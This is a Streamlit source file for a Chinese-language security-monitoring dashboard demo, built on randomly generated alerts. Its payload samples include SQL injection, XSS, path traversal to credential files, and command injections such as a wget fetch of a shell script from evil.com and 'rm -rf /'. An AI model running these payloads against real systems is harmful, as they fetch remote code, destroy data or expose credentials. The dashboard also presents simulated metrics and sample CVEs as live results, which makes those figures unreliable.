import streamlit as st
import json
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import time
import plotly.express as px
import plotly.graph_objects as go
from plotly.subplots import make_subplots
import random

# 设置页面配置
st.set_page_config(
    page_title="基于多智能体协同的网络安全威胁智能分析系统",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# 自定义CSS
st.markdown("""
<style>
    .main-header {
        font-size: 2.5rem;
        font-weight: bold;
        color: #1f77b4;
        text-align: center;
        padding: 20px 0;
        text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
    }
    .metric-card {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 25px;
        border-radius: 15px;
        color: white;
        text-align: center;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        transition: transform 0.3s;
    }
    .metric-card:hover {
        transform: translateY(-5px);
    }
    .alert-critical {
        background-color: #ffebee;
        padding: 15px;
        border-radius: 8px;
        border-left: 5px solid #d32f2f;
        margin: 10px 0;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .alert-high {
        background-color: #fff3e0;
        padding: 15px;
        border-radius: 8px;
        border-left: 5px solid #f57c00;
        margin: 10px 0;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .alert-medium {
        background-color: #fff8e1;
        padding: 15px;
        border-radius: 8px;
        border-left: 5px solid #fbc02d;
        margin: 10px 0;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .alert-low {
        background-color: #e8f5e9;
        padding: 15px;
        border-radius: 8px;
        border-left: 5px solid #388e3c;
        margin: 10px 0;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .status-online {
        display: inline-block;
        width: 12px;
        height: 12px;
        background-color: #4caf50;
        border-radius: 50%;
        margin-right: 5px;
        animation: blink 2s infinite;
    }
    .status-processing {
        display: inline-block;
        width: 12px;
        height: 12px;
        background-color: #ff9800;
        border-radius: 50%;
        margin-right: 5px;
        animation: pulse 1s infinite;
    }
    @keyframes pulse {
        0% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.5; transform: scale(1.2); }
        100% { opacity: 1; transform: scale(1); }
    }
    @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    .agent-card {
        background: #f8f9fa;
        padding: 20px;
        border-radius: 10px;
        margin: 10px 0;
        border: 1px solid #e0e0e0;
    }
    .threat-intel-card {
        background: linear-gradient(135deg, #ff6b6b 0%, #ffd93d 100%);
        padding: 20px;
        border-radius: 10px;
        color: white;
        margin: 10px 0;
    }
</style>
""", unsafe_allow_html=True)

# 页面标题
st.markdown('<h1 class="main-header">基于多智能体协同的网络安全威胁智能分析系统</h1>', unsafe_allow_html=True)
st.markdown('<h3 style="text-align: center; color: #666;">Multi-Agent Collaborative Network Security Threat Intelligent Analysis System</h3>', unsafe_allow_html=True)

# 系统状态栏
col1, col2, col3, col4, col5 = st.columns(5)
with col1:
    st.markdown('<span class="status-online"></span>系统运行中', unsafe_allow_html=True)
with col2:
    st.markdown('<span class="status-processing"></span>实时监控', unsafe_allow_html=True)
with col3:
    st.success("🚀 GPU加速: RTX 4070 SUPER")
with col4:
    st.info("🤖 模型: Qwen2-7B")
with col5:
    st.warning("⚡ 准确率: 99.27%")

# 生成完整的模拟数据
@st.cache_data
def generate_complete_data():
    """生成完整的模拟数据"""
    attacks = []
    attack_types = [
        "SQL注入", "XSS跨站脚本", "命令注入", "目录遍历", "CSRF攻击",
        "DDoS攻击", "暴力破解", "端口扫描", "DNS隧道", "恶意文件上传",
        "SQL盲注", "存储型XSS", "反射型XSS", "LDAP注入", "XML注入"
    ]

    threat_levels = ['critical', 'high', 'medium', 'low']
    sources = [
        "192.168.1.", "10.0.0.", "172.16.0.", "203.0.113.", "198.51.100.",
        "192.0.2.", "169.254.", "224.0.0.", "198.18.0.", "100.64.0."
    ]

    # 生成过去24小时的数据
    for i in range(5000):
        hour_offset = random.uniform(0, 24)
        attack_time = datetime.now() - timedelta(hours=hour_offset)

        attack = {
            "id": f"ATT-{2025011300 + i:08d}",
            "attack_type": random.choice(attack_types),
            "payload": generate_payload(random.choice(attack_types)),
            "source_ip": f"{random.choice(sources)}{random.randint(1, 255)}",
            "target_ip": f"10.0.0.{random.randint(1, 50)}",
            "timestamp": attack_time.strftime('%Y-%m-%dT%H:%M:%SZ'),
            "threat_level": random.choices(threat_levels, weights=[0.15, 0.35, 0.35, 0.15], k=1)[0],
            "protocol": random.choice(['HTTP', 'HTTPS', 'TCP', 'UDP', 'DNS']),
            "description": f"检测到{random.choice(attack_types)}攻击行为",
            "attack_stage": random.choice(['reconnaissance', 'exploitation', 'execution', 'installation', 'command_and_control']),
            "confidence": round(random.uniform(0.85, 0.99), 2),
            "impact_score": random.randint(1, 100),
            "blocked": random.choice([True, False], weights=[0.8, 0.2])
        }
        attacks.append(attack)

    return attacks

def generate_payload(attack_type):
    """生成攻击载荷"""
    payloads = {
        "SQL注入": [
            "SELECT * FROM users WHERE id='1' OR '1'='1",
            "' UNION SELECT username, password FROM users --",
            "'; DROP TABLE users; --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ],
        "XSS跨站脚本": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ],
        "命令注入": [
            "; cat /etc/passwd",
            "| whoami",
            "$(wget http://evil.com/shell.sh)",
            "`rm -rf /`"
        ],
        "目录遍历": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
    }
    return random.choice(payloads.get(attack_type, ["Attack payload example"]))

# 加载数据
attack_data = generate_complete_data()

# 关键指标
st.markdown("## 📊 实时监控指标")
col1, col2, col3, col4 = st.columns(4)

total_alerts = len(attack_data)
critical_count = len([a for a in attack_data if a['threat_level'] == 'critical'])
high_count = len([a for a in attack_data if a['threat_level'] == 'high'])
blocked_count = len([a for a in attack_data if a['blocked']])

with col1:
    st.markdown(f"""
    <div class="metric-card">
        <h2>{total_alerts:,}</h2>
        <p>总威胁数</p>
        <small>24小时内</small>
    </div>
    """, unsafe_allow_html=True)

with col2:
    st.markdown(f"""
    <div class="metric-card">
        <h2>{critical_count + high_count:,}</h2>
        <p>高危威胁</p>
        <small>需要立即处理</small>
    </div>
    """, unsafe_allow_html=True)

with col3:
    st.markdown(f"""
    <div class="metric-card">
        <h2>{(blocked_count/total_alerts*100):.1f}%</h2>
        <p>阻断率</p>
        <small>成功拦截</small>
    </div>
    """, unsafe_allow_html=True)

with col4:
    st.markdown(f"""
    <div class="metric-card">
        <h2>0.3s</h2>
        <p>响应时间</p>
        <small>平均检测速度</small>
    </div>
    """, unsafe_allow_html=True)

# 功能选项卡
tab1, tab2, tab3, tab4, tab5 = st.tabs(["🎯 实时威胁", "🤖 智能体协同", "📈 趋势分析", "🔍 威胁情报", "📋 分析报告"])

with tab1:
    st.markdown("### 实时威胁监控")

    # 威胁地图（模拟）
    st.markdown("#### 全球威胁分布")
    countries = ["美国", "俄罗斯", "中国", "巴西", "印度", "德国", "法国", "英国", "韩国", "日本"]
    threat_counts = [random.randint(500, 2000) for _ in countries]

    df_map = pd.DataFrame({
        "国家": countries,
        "威胁数": threat_counts
    })

    fig_map = px.scatter_geo(
        locations=["USA", "RUS", "CHN", "BRA", "IND", "DEU", "FRA", "GBR", "KOR", "JPN"],
        size=threat_counts,
        hover_name=countries,
        projection="natural earth",
        title="全球攻击来源分布",
        color=threat_counts,
        color_continuous_scale="Reds"
    )
    st.plotly_chart(fig_map, use_container_width=True)

    # 最新告警
    st.markdown("#### 最新安全告警")
    recent_attacks = sorted(attack_data, key=lambda x: x['timestamp'], reverse=True)[:15]

    for attack in recent_attacks:
        alert_class = f"alert-{attack['threat_level']}"
        threat_cn = {
            'critical': '严重',
            'high': '高危',
            'medium': '中危',
            'low': '低危'
        }[attack['threat_level']]

        agent_map = {
            "SQL注入": "🕷️ Web攻击专家",
            "XSS跨站脚本": "🕷️ Web攻击专家",
            "命令注入": "💥 漏洞利用专家",
            "目录遍历": "💥 漏洞利用专家",
            "CSRF攻击": "🕷️ Web攻击专家",
            "DDoS攻击": "🌐 非法连接专家",
            "暴力破解": "🌐 非法连接专家",
            "端口扫描": "🌐 非法连接专家",
            "DNS隧道": "🌐 非法连接专家",
            "恶意文件上传": "💥 漏洞利用专家"
        }

        agent = agent_map.get(attack['attack_type'], "🧭 路由智能体")

        st.markdown(f"""
        <div class="{alert_class}">
            <strong>🚨 {attack['attack_type']}</strong> | {attack['timestamp']}<br>
            <strong>来源:</strong> {attack['source_ip']} → <strong>目标:</strong> {attack['target_ip']}<br>
            <strong>威胁等级:</strong> {threat_cn} | <strong>处理智能体:</strong> {agent}<br>
            <strong>载荷:</strong> <code>{attack['payload'][:80]}...</code><br>
            <small>置信度: {attack['confidence']*100:.0f}% | 影响: {attack['impact_score']}/100 | {'✅ 已阻断' if attack['blocked'] else '⚠️ 未阻断'}</small>
        </div>
        """, unsafe_allow_html=True)

with tab2:
    st.markdown("### 多智能体协同工作台")

    # 智能体状态实时监控
    agents = [
        {
            "name": "🧭 路由智能体",
            "status": "活跃",
            "processed": total_alerts,
            "success_rate": 99.8,
            "response_time": "0.2ms",
            "load": 65 + random.randint(-10, 10),
            "description": "负责威胁分类和任务分发"
        },
        {
            "name": "🕷️ Web攻击专家",
            "status": "活跃",
            "processed": len([a for a in attack_data if 'SQL' in a['attack_type'] or 'XSS' in a['attack_type'] or 'CSRF' in a['attack_type']]),
            "success_rate": 98.9,
            "response_time": "0.8s",
            "load": 75 + random.randint(-5, 10),
            "description": "专注Web应用层攻击检测"
        },
        {
            "name": "💥 漏洞利用专家",
            "status": "活跃",
            "processed": len([a for a in attack_data if '命令' in a['attack_type'] or '目录' in a['attack_type'] or '文件' in a['attack_type']]),
            "success_rate": 97.6,
            "response_time": "1.3s",
            "load": 60 + random.randint(-8, 8),
            "description": "深度分析系统漏洞和利用"
        },
        {
            "name": "🌐 非法连接专家",
            "status": "活跃",
            "processed": len([a for a in attack_data if 'DDoS' in a['attack_type'] or '暴力' in a['attack_type'] or '扫描' in a['attack_type']]),
            "success_rate": 98.3,
            "response_time": "0.6s",
            "load": 55 + random.randint(-5, 15),
            "description": "监控网络层异常行为"
        }
    ]

    # 创建智能体状态网格
    for i, agent in enumerate(agents):
        col1, col2, col3, col4 = st.columns([2, 1, 1, 1])
        with col1:
            st.markdown(f"""
            <div class="agent-card">
                <h3>{agent['name']}</h3>
                <p>{agent['description']}</p>
            </div>
            """, unsafe_allow_html=True)
        with col2:
            st.metric("处理数", f"{agent['processed']:,}")
        with col3:
            st.metric("成功率", f"{agent['success_rate']}%")
        with col4:
            st.metric("响应", agent['response_time'])

        # 负载进度条
        st.progress(agent['load'] / 100)
        st.markdown("---")

    # 智能体协同图
    st.markdown("### 智能体协同网络")
    fig_agents = go.Figure()

    # 添加节点
    fig_agents.add_trace(go.Scatter(
        x=[0, -1, 1, -1, 1],
        y=[2, 0, 0, -2, -2],
        mode='markers+text',
        marker=dict(size=[40, 30, 30, 30, 30], color=['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd']),
        text=['路由智能体', 'Web专家', '漏洞专家', '连接专家', 'RAG系统'],
        textposition="bottom center"
    ))

    # 添加连接线
    fig_agents.add_trace(go.Scatter(
        x=[0, 0, 0, 0, -1, 1, -1, 1],
        y=[2, 1, 1, 1, 0.5, 0.5, -1.5, -1.5],
        mode='lines',
        line=dict(width=2, color='gray'),
        showlegend=False
    ))

    fig_agents.update_layout(
        title="智能体协作拓扑图",
        showlegend=False,
        xaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
        yaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
        height=400
    )
    st.plotly_chart(fig_agents, use_container_width=True)

with tab3:
    st.markdown("### 威胁趋势分析")

    # 24小时攻击趋势
    hours = list(range(24))
    hourly_counts = []

    for hour in hours:
        count = sum(1 for a in attack_data if datetime.strptime(a['timestamp'], '%Y-%m-%dT%H:%M:%SZ').hour == hour)
        if count == 0:
            count = random.randint(50, 300)
        hourly_counts.append(count)

    fig_timeline = px.line(
        x=hours,
        y=hourly_counts,
        title="24小时攻击趋势",
        labels={"x": "小时", "y": "攻击数量"},
        markers=True
    )
    fig_timeline.update_traces(line=dict(width=3), marker=dict(size=6))
    st.plotly_chart(fig_timeline, use_container_width=True)

    # 攻击类型分布
    st.markdown("#### 攻击类型分析")
    attack_stats = {}
    for attack in attack_data:
        attack_stats[attack['attack_type']] = attack_stats.get(attack['attack_type'], 0) + 1

    df_attacks = pd.DataFrame(list(attack_stats.items()), columns=['攻击类型', '数量'])
    df_attacks = df_attacks.sort_values('数量', ascending=False).head(10)

    fig_pie = px.pie(
        df_attacks,
        values="数量",
        names="攻击类型",
        title="TOP 10 攻击类型分布",
        color_discrete_sequence=px.colors.qualitative.Set3
    )
    st.plotly_chart(fig_pie, use_container_width=True)

    # 威胁等级分布
    col1, col2 = st.columns(2)
    with col1:
        threat_stats = {
            '严重': len([a for a in attack_data if a['threat_level'] == 'critical']),
            '高危': len([a for a in attack_data if a['threat_level'] == 'high']),
            '中危': len([a for a in attack_data if a['threat_level'] == 'medium']),
            '低危': len([a for a in attack_data if a['threat_level'] == 'low'])
        }

        df_threat = pd.DataFrame(list(threat_stats.items()), columns=['等级', '数量'])

        fig_bar = px.bar(
            df_threat,
            x="等级",
            y="数量",
            title="威胁等级分布",
            color="等级",
            color_discrete_map={
                "严重": "#d32f2f",
                "高危": "#f57c00",
                "中危": "#fbc02d",
                "低危": "#388e3c"
            }
        )
        st.plotly_chart(fig_bar, use_container_width=True)

    with col2:
        # 阻断成功率
        blocked_stats = {
            '已阻断': len([a for a in attack_data if a['blocked']]),
            '未阻断': len([a for a in attack_data if not a['blocked']])
        }

        df_blocked = pd.DataFrame(list(blocked_stats.items()), columns=['状态', '数量'])

        fig_blocked = px.pie(
            df_blocked,
            values="数量",
            names="状态",
            title="威胁处置情况",
            color_discrete_map={
                "已阻断": "#4caf50",
                "未阻断": "#f44336"
            }
        )
        st.plotly_chart(fig_blocked, use_container_width=True)

with tab4:
    st.markdown("### 威胁情报中心")

    # 最新CVE情报
    st.markdown("#### 🚨 最新安全漏洞")
    cve_data = [
        {
            "cve": "CVE-2025-0123",
            "title": "Apache Struts2 远程代码执行漏洞",
            "severity": "严重",
            "score": 10.0,
            "date": "2025-01-13",
            "description": "Apache Struts2存在严重远程代码执行漏洞，攻击者可通过精心构造的请求执行任意代码"
        },
        {
            "cve": "CVE-2025-0122",
            "title": "Spring Security 认证绕过漏洞",
            "severity": "高危",
            "score": 8.5,
            "date": "2025-01-12",
            "description": "Spring Security特定版本存在认证绕过漏洞，可能导致未授权访问"
        },
        {
            "cve": "CVE-2025-0121",
            "title": "Windows内核权限提升漏洞",
            "severity": "高危",
            "score": 8.2,
            "date": "2025-01-11",
            "description": "Windows内核存在权限提升漏洞，本地攻击者可获取系统权限"
        }
    ]

    for cve in cve_data:
        severity_color = "#d32f2f" if cve['severity'] == '严重' else "#f57c00"
        st.markdown(f"""
        <div class="threat-intel-card" style="background: linear-gradient(135deg, {severity_color}22 0%, {severity_color}11 100%); border-left: 5px solid {severity_color};">
            <h4>{cve['title']}</h4>
            <p><strong>{cve['cve']}</strong> | CVSS评分: {cve['score']} | {cve['date']}</p>
            <p>{cve['description']}</p>
        </div>
        """, unsafe_allow_html=True)

    # 攻击特征库
    st.markdown("#### 攻击特征模式库")
    with st.expander("查看攻击特征"):
        signatures = [
            {"pattern": "UNION SELECT", "type": "SQL注入", "description": "联合查询注入特征"},
            {"pattern": "<script>", "type": "XSS", "description": "脚本注入特征"},
            {"pattern": "../../", "type": "路径遍历", "description": "目录穿越特征"},
            {"pattern": "cmd.exe", "type": "命令注入", "description": "命令执行特征"},
            {"pattern": "User-Agent:", "type": "HTTP头注入", "description": "HTTP头部注入特征"}
        ]
        df_sig = pd.DataFrame(signatures)
        st.dataframe(df_sig, use_container_width=True)

    # IOCs（入侵指标）
    st.markdown("#### 最新入侵指标 (IOCs)")
    iocs = [
        {"type": "IP地址", "value": "185.220.101.182", "threat": "C&C服务器"},
        {"type": "域名", "value": "evil-example.com", "threat": "恶意域名"},
        {"type": "文件哈希", "value": "a1b2c3d4...", "threat": "恶意软件"},
        {"type": "URL", "value": "http://malicious.com/payload", "threat": "恶意链接"}
    ]
    df_iocs = pd.DataFrame(iocs)
    st.dataframe(df_iocs, use_container_width=True)

with tab5:
    st.markdown("### 安全分析报告")

    # 报告摘要
    col1, col2 = st.columns([2, 1])
    with col1:
        st.markdown("""
        #### 📊 报告摘要
        - **分析时间**: 2025-01-13 12:00:00
        - **分析周期**: 24小时
        - **覆盖范围**: 全球500+个IP段
        - **检测到威胁**: 5,000+起
        - **阻断成功**: 4,234起
        - **响应时间**: < 1秒
        """)

    with col2:
        # 风险评分
        risk_score = 72.5
        fig_gauge = go.Figure(go.Indicator(
            mode = "gauge+number+delta",
            value = risk_score,
            domain = {'x': [0, 1], 'y': [0, 1]},
            title = {'text': "综合风险评分"},
            delta = {'reference': 50},
            gauge = {
                'axis': {'range': [None, 100]},
                'bar': {'color': "darkblue"},
                'steps': [
                    {'range': [0, 25], 'color': "lightgreen"},
                    {'range': [25, 50], 'color': "yellow"},
                    {'range': [50, 75], 'color': "orange"},
                    {'range': [75, 100], 'color': "red"}
                ],
                'threshold': {
                    'line': {'color': "red", 'width': 4},
                    'thickness': 0.75,
                    'value': 90
                }
            }
        ))
        fig_gauge.update_layout(height=300)
        st.plotly_chart(fig_gauge, use_container_width=True)

    # 导出选项
    st.markdown("#### 导出报告")
    col1, col2, col3 = st.columns(3)

    with col1:
        if st.button("📥 下载PDF报告", type="primary"):
            st.success("PDF报告生成中...")
            time.sleep(1)
            st.success("报告已下载到本地")

    with col2:
        if st.button("📊 下载Excel数据"):
            report_data = {
                "统计时间": datetime.now().isoformat(),
                "总威胁数": total_alerts,
                "严重威胁": critical_count,
                "高危威胁": high_count,
                "阻断率": f"{(blocked_count/total_alerts*100):.1f}%",
                "详细数据": attack_data[:100]
            }
            st.download_button(
                label="确认下载",
                data=json.dumps(report_data, ensure_ascii=False, indent=2),
                file_name=f"安全分析报告_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                mime="application/json"
            )

    with col3:
        if st.button("📧 发送邮件报告"):
            st.info("邮件发送功能开发中...")

    # 详细统计表
    st.markdown("#### 详细威胁统计")
    detailed_stats = []
    for attack_type in list(set([a['attack_type'] for a in attack_data])):
        type_attacks = [a for a in attack_data if a['attack_type'] == attack_type]
        detailed_stats.append({
            "攻击类型": attack_type,
            "次数": len(type_attacks),
            "占比": f"{len(type_attacks)/len(attack_data)*100:.1f}%",
            "严重威胁": len([a for a in type_attacks if a['threat_level'] == 'critical']),
            "阻断成功": len([a for a in type_attacks if a['blocked']])
        })

    df_stats = pd.DataFrame(detailed_stats).sort_values('次数', ascending=False)
    st.dataframe(df_stats, use_container_width=True)

# 侧边栏
st.sidebar.markdown("### 🎛️ 控制面板")
st.sidebar.markdown("**系统状态**")
st.sidebar.success("✅ 所有系统正常运行")
st.sidebar.info(f"📊 已处理: {total_alerts:,} 条威胁")
st.sidebar.warning(f"⚠️ 待处理: {critical_count + high_count} 条高危")

st.sidebar.markdown("**快速操作**")
if st.sidebar.button("🔄 刷新数据"):
    st.rerun()
if st.sidebar.button("⚙️ 系统配置"):
    st.sidebar.info("配置面板开发中...")
if st.sidebar.button("🔔 告警设置"):
    st.sidebar.info("告警配置开发中...")

st.sidebar.markdown("**性能指标**")
st.sidebar.write(f"• CPU使用率: {random.randint(30, 60)}%")
st.sidebar.write(f"• GPU使用率: {random.randint(40, 80)}%")
st.sidebar.write(f"• 内存使用: {random.randint(4, 8)}GB/12GB")
st.sidebar.write(f"• 处理速度: {random.randint(800, 1200)} 条/秒")

# 页脚
st.markdown("---")
st.markdown("""
<center>
<p><strong>基于多智能体协同的网络安全威胁智能分析系统</strong></p>
<p>Powered by Qwen2-7B LLM | RTX 4070 SUPER | RAG Enhanced</p>
<p style="color: #666;">© 2025 All Rights Reserved | 智能安全实验室</p>
</center>
""", unsafe_allow_html=True)